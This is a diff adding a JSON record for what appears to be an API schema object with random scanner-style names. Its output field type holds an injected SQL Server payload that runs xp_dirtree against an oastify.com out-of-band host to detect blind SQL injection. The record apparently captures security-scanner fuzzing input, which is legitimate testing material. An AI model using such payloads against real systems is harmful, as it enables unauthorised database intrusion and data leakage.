@@ -1,0 +1,33 @@
+{
+	"createdTime":1741334581395,
+	"deleted":true,
+	"description":"SZHLUr",
+	"id":"67caa8358780f312882565fc",
+	"input":{
+		"type":"SCHEMA",
+		"dynamic":false,
+		"schema":{
+			"ua:modal":{
+				"field_type":"STRING",
+				"is_optional":true
+			}
+		}
+	},
+	"lastModifiedBy":22743,
+	"lcName":"qvfspo",
+	"modifiedTime":1741358656517,
+	"name":"QvfSPO",
+	"output":{
+		"type":"SCHEMA",
+		"dynamic":false,
+		"schema":{
+			"ua:modal":{
+				"field_type":"STRING;declare @q varchar(99);set @q='\\\\l7tsazcs8vnl03xmjkcmu7g3iuonco0fq3iqee3.oasti'+'fy.com\\yzs'; exec master.dbo.xp_dirtree @q;-- ",
+				"is_optional":true
+			}
+		}
+	},
+	"ownerUserId":22743,
+	"standard":false,
+	"version":1
+}
